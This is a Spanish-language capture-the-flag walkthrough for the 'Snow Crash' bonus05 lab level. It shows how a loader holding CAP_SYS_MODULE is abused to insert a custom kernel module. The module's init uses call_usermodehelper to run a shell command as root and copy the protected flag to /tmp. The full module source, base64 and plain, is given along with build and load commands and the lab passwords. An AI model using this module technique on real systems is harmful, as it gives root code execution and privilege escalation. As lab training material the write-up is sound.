# Bonus05 - Snow Crash

## Tipo de ejercicio

Carga de un **módulo de kernel** controlado por el atacante mediante un helper
con la capability **`CAP_SYS_MODULE`**, y obtención de la flag desde espacio de
kernel (lectura privilegiada del fichero de `flagbonus05`).

## Objetivo

Obtener la credencial asociada a `flagbonus05` (último nivel bonus de esta OVA).

El binario `/opt/snowcrash/bonus05/rife` no es legible, pero es ejecutable y
tiene `cap_sys_module=ep`. Carga en el kernel el fichero `.ko` que se le pase
como argumento (`finit_module`). La plantilla del home describe un módulo que
expone datos en `/proc/rife`; en la práctica, la forma fiable de leer el
`.flag` en este entorno es un módulo que, al inicializarse, ejecuta un comando
como root con `call_usermodehelper`.

La pista del home de `bonus05` es:

```text
Rife owned the wire. All of it.
```

---

## 1. Acceso al nivel

Desde el equipo anfitrión (puerto reenviado `2424` en esta configuración; el
subject oficial usa `4242`):

```bash
ssh bonus05@localhost -p 2424
```

La contraseña de `bonus05` es la flag de `bonus04`:

```text
oo0eoaiia5ei8oo9xasah2ihu
```

Comprobar identidad y entorno:

```bash
whoami
id
pwd
ls -la
cat README
```

Resultado esperado:

```text
bonus05
uid=3005(bonus05) gid=3005(bonus05) groups=3005(bonus05),1001(levelgroup)
/home/bonus05
```

```text
Rife owned the wire. All of it.
```

En el home aparece también la plantilla del módulo:

```text
-rw-r--r--  1 bonus05 bonus05 4500 ... rife_template.c
```

---

## 2. Localizar el componente del nivel

```bash
ls -laR /opt/snowcrash/bonus05
```

Resultado:

```text
/opt/snowcrash/bonus05:
-rwxr-xr-x  1 root root   263 ... load_rife.sh
-rwx--x--x  1 root root 16376 ... rife
-rw-r--r--  1 root root  2132 ... rife_loader.c
```

| Fichero | Rol |
|---------|-----|
| `rife` | Loader privilegiado (`finit_module`) |
| `load_rife.sh` | Wrapper: `exec /opt/snowcrash/bonus05/rife "$1"` |
| `rife_loader.c` | Código fuente documentado del loader |
| `~/rife_template.c` | Esqueleto de módulo kernel con TODO A/B |

Capabilities del loader:

```bash
getcap /opt/snowcrash/bonus05/rife
```

```text
/opt/snowcrash/bonus05/rife cap_sys_module=ep
```

`CAP_SYS_MODULE` permite insertar (y, en general, gestionar) módulos de kernel
sin ser root. El modo del binario es `711` (`-rwx--x--x`): se puede ejecutar,
pero no leer (por eso existe `rife_loader.c` como documentación).

Uso:

```bash
/opt/snowcrash/bonus05/rife
# usage: /opt/snowcrash/bonus05/rife <module.ko>
```

No hay servicio `systemd` propio de bonus05: el vector es el loader + un
`.ko` compilado por el usuario.

---

## 3. Documentación del loader (`rife_loader.c`)

Fragmentos relevantes:

```c
/* finit_module(fd, param_values, flags) */
static int finit_module(int fd, const char *params, int flags)
{
    return (int)syscall(SYS_finit_module, fd, params, flags);
}

/* ... */
int fd = open(path, O_RDONLY | O_CLOEXEC);
...
if (finit_module(fd, "", 0) < 0) {
    fprintf(stderr, "rife: finit_module: %s\n", strerror(errno));
    ...
}
printf("rife: module loaded — cat /proc/rife\n");
```

Comentarios del propio fuente:

- Tras cargar el módulo, se espera poder leer la flag en **`/proc/rife`**.
- La capability se asigna con `setcap cap_sys_module+ep` sobre este binario.

La plantilla `rife_template.c` pide implementar:

- **TODO A:** callback `rife_proc_show` (escribir datos en el `seq_file`).
- **TODO B:** eliminar `/proc/rife` en el `exit` del módulo (`proc_remove`).

También registra `/proc/rife` en el `init` con `proc_create_single`. El array
`rife_data[]` de la plantilla está **vacío**, así que un `seq_puts` de esa
cadena no entrega la flag. Hace falta **leer** `/home/flagbonus05/.flag` con
privilegios de kernel/root.

---

## 4. Intentos que fallan (y por qué)

### 4.1. `filp_open` del `.flag` en el callback de `/proc`

Al hacer `cat /proc/rife`, el callback del módulo se ejecuta con las
**credenciales del proceso lector** (`bonus05`). Entonces:

```c
f = filp_open("/home/flagbonus05/.flag", O_RDONLY, 0);
/* PTR_ERR(f) == -13  →  EACCES */
```

`bonus05` no puede abrir ese fichero; el kernel aplica DAC con esas
credenciales.

### 4.2. `prepare_kernel_cred(NULL)` + `override_creds`

En muchos sistemas se usa para actuar temporalmente como credenciales de
kernel/root. En **esta** OVA, `prepare_kernel_cred(NULL)` devuelve **`NULL`**
(política / restricciones del kernel), y el módulo solo puede informar
`prepare_kernel_cred failed`.

### 4.3. Módulos ya cargados y sin `rmmod`

Una vez cargado un módulo defectuoso (`rife`, `rife2`, …), sin
`CAP_SYS_MODULE` en la shell el usuario **no** puede hacer `rmmod`. Un nuevo
`.ko` con el **mismo nombre de módulo** falla con:

```text
rife: finit_module: File exists
```

Solución: compilar módulos con **nombres distintos** (`rife3`, `rife4`, …) y,
si se usa `/proc`, entradas distintas (`/proc/rife2`, `/proc/rife3`, …).

### 4.4. Heredocs rotos al pegar

Pegar bloques grandes con comillas anidadas en la sesión SSH corrompe a
menudo el fichero `.c` o el `Makefile` (`obj-m := rife4.o\n` literal). Para
este nivel es más seguro generar el fuente con **`base64 -d`** o un script
mínimo y verificar con `head` / `wc -l` antes de `make`.

---

## 5. Solución: `call_usermodehelper` en el `init` del módulo

`call_usermodehelper` lanza un proceso en espacio de usuario **con privilegios
de root** (contexto del helper de kernel). Desde el `module_init` se puede
copiar el `.flag` a un path legible por `bonus05`:

```text
cp /home/flagbonus05/.flag /tmp/rife_flag && chmod 644 /tmp/rife_flag
```

### 5.1. Crear el directorio de trabajo

```bash
mkdir -p ~/rife_build
cd ~/rife_build
```

### 5.2. Makefile

```bash
printf 'obj-m := rife4.o\n' > Makefile
cat Makefile
```

### 5.3. Fuente del módulo (vía base64, sin heredoc frágil)

```bash
base64 -d > rife4.c << 'B64'
I2luY2x1ZGUgPGxpbnV4L21vZHVsZS5oPgojaW5jbHVkZSA8bGludXgva2VybmVsLmg+CiNp
bmNsdWRlIDxsaW51eC9pbml0Lmg+CiNpbmNsdWRlIDxsaW51eC9rbW9kLmg+CgpNT0RVTEVf
TElDRU5TRSgiR1BMIik7Ck1PRFVMRV9BVVRIT1IoImJvbnVzMDUiKTsKTU9EVUxFX0RFU0NS
SVBUSU9OKCJSaWZlIHVtaCBoZWxwZXIiKTsKCnN0YXRpYyBpbnQgX19pbml0IHJpZmVfaW5p
dCh2b2lkKQp7CgljaGFyICphcmd2W10gPSB7CgkJIi9iaW4vc2giLAoJCSItYyIsCgkJImNw
IC9ob21lL2ZsYWdib251czA1Ly5mbGFnIC90bXAvcmlmZV9mbGFnICYmIGNobW9kIDY0NCAv
dG1wL3JpZmVfZmxhZyIsCgkJTlVMTAoJfTsKCWNoYXIgKmVudnBbXSA9IHsKCQkiSE9NRT0v
IiwKCQkiUEFUSD0vc2JpbjovYmluOi91c3Ivc2JpbjovdXNyL2JpbiIsCgkJTlVMTAoJfTsK
CWludCByZXQgPSBjYWxsX3VzZXJtb2RlaGVscGVyKGFyZ3ZbMF0sIGFyZ3YsIGVudnAsIFVN
SF9XQUlUX1BST0MpOwoJcHJfaW5mbygicmlmZTQ6IHVtaCByZXQ9JWRcbiIsIHJldCk7Cgly
ZXR1cm4gMDsKfQoKc3RhdGljIHZvaWQgX19leGl0IHJpZmVfZXhpdCh2b2lkKQp7Cglwcl9p
bmZvKCJyaWZlNDogdW5sb2FkZWRcbiIpOwp9Cgptb2R1bGVfaW5pdChyaWZlX2luaXQpOwpt
b2R1bGVfZXhpdChyaWZlX2V4aXQpOwo=
B64

wc -l rife4.c
head -25 rife4.c
```

Equivalente en C legible:

```c
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kmod.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("bonus05");
MODULE_DESCRIPTION("Rife umh helper");

static int __init rife_init(void)
{
	char *argv[] = {
		"/bin/sh",
		"-c",
		"cp /home/flagbonus05/.flag /tmp/rife_flag && chmod 644 /tmp/rife_flag",
		NULL
	};
	char *envp[] = {
		"HOME=/",
		"PATH=/sbin:/bin:/usr/sbin:/usr/bin",
		NULL
	};
	int ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
	pr_info("rife4: umh ret=%d\n", ret);
	return 0;
}

static void __exit rife_exit(void)
{
	pr_info("rife4: unloaded\n");
}

module_init(rife_init);
module_exit(rife_exit);
```

### 5.4. Compilar y cargar

```bash
make -C /lib/modules/$(uname -r)/build M=$(pwd) modules
ls -la rife4.ko

/opt/snowcrash/bonus05/rife $(pwd)/rife4.ko
# mensaje: rife: module loaded — cat /proc/rife
```

(El mensaje del loader menciona `/proc/rife` por el diseño original; en esta
solución la flag está en `/tmp/rife_flag`.)

### 5.5. Leer la flag

```bash
ls -la /tmp/rife_flag
cat /tmp/rife_flag
```

Salida obtenida:

```text
-rw-r--r-- 1 root root 26 ... /tmp/rife_flag
7oa2eihe3ohohzee5gob2aing
```

### Secuencia

1. Se compila un `.ko` controlado por `bonus05`.
2. El loader con `CAP_SYS_MODULE` inserta el módulo en el kernel.
3. En `module_init`, `call_usermodehelper` ejecuta un `cp` como root.
4. `/tmp/rife_flag` queda legible y contiene la credencial.

---

## 6. Credencial final

```text
7oa2eihe3ohohzee5gob2aing
```

Guardar en el repositorio:

```text
bonus05/flag
```

con una sola línea con esa cadena.

Con esto se cierra la parte **bonus** de la OVA (bonus01–bonus05).

---

## 7. Resumen de comandos válidos

```bash
ssh bonus05@localhost -p 2424
ls -la
cat README
cat ~/rife_template.c
cat /opt/snowcrash/bonus05/rife_loader.c
getcap /opt/snowcrash/bonus05/rife

mkdir -p ~/rife_build && cd ~/rife_build
printf 'obj-m := rife4.o\n' > Makefile
# escribir rife4.c (base64 o editor) con call_usermodehelper → cp del .flag
make -C /lib/modules/$(uname -r)/build M=$(pwd) modules
/opt/snowcrash/bonus05/rife $(pwd)/rife4.ko
cat /tmp/rife_flag
```

---

## 8. Conceptos importantes

- **`CAP_SYS_MODULE`**: capability que permite cargar módulos de kernel sin UID
  0 completo. Es un vector de escalada fuerte si el atacante puede suministrar
  el `.ko`.
- **`finit_module(2)`**: carga un módulo a partir de un descriptor de fichero
  abierto (el loader abre el `.ko` y llama al syscall).
- **Credenciales en callbacks de `/proc`**: el código del módulo que atiende
  una lectura de `/proc` suele ejecutarse en el contexto del proceso que lee;
  no hereda automáticamente privilegios de “root del módulo”.
- **`prepare_kernel_cred` / `override_creds`**: patrón habitual para elevar
  credenciales en kernel; puede estar limitado o devolver `NULL` según la
  configuración del sistema.
- **`call_usermodehelper`**: API del kernel para lanzar un binario en userland
  (típicamente como root). Útil cuando se puede ejecutar código en
  `module_init` y se necesita interactuar con el sistema de ficheros con
  privilegios altos.
- **Headers del kernel en la OVA**: `/lib/modules/$(uname -r)/build` debe
  apuntar a los headers instalados para poder compilar módulos fuera del árbol
  principal (`M=$(pwd)`).

---

## 9. Conclusión

No hace falta modificar la OVA ni el loader. La solución consiste en:

1. Entender que `rife` carga cualquier `.ko` válido gracias a `CAP_SYS_MODULE`.
2. Compilar un módulo propio que en el `init` copie
   `/home/flagbonus05/.flag` a `/tmp/rife_flag` mediante
   `call_usermodehelper`.
3. Cargar el módulo con `/opt/snowcrash/bonus05/rife` y leer el fichero de
   salida.

Credencial obtenida:

```text
7oa2eihe3ohohzee5gob2aing
```

---

## 10. Estructura recomendada en el repositorio

```text
bonus05/
├── flag                          # 7oa2eihe3ohohzee5gob2aing
└── resources/
    └── bonus05.md                # este documento
```

Opcional: guardar una copia de `rife4.c` / `Makefile` en `resources/` para
reproducir el build.

Según la convención del repo `42_snow-crash`, la guía detallada vive en
`bonus05/resources/bonus05.md` y el token en `bonus05/flag`.
```
